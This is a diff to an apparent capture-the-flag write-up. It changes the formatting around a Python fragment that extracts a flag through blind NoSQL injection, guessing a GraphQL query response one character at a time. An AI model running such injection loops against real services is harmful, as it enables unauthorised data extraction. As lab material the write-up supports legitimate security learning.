@@ -170,7 +170,7 @@ The injection worked, now we can re-use the payload from the challenge #2 and ex
 
 Obviously we scripted the data extraction in Python, the script below will get the last flag : `4f537c0a-7da6-4acc-81e1-8c33c02ef3b`.
 
-```python
+{% highlight javascript %}
 def blind_nosql(URL):
     data = ""
     data_size = 35
@@ -183,7 +183,7 @@ def blind_nosql(URL):
             if r.json()['data']['doctors'] != []:
                 data += c
                 print("\033[92m[+] Data found:\033[0m {}".format(data))
-```
+{% endhighlight %}
 
 At that time we were checking if the content of `r.json()['data']['doctors']` was not empty, in order to abstract the data extraction we now take a check input from the user in order to compare the output.
 
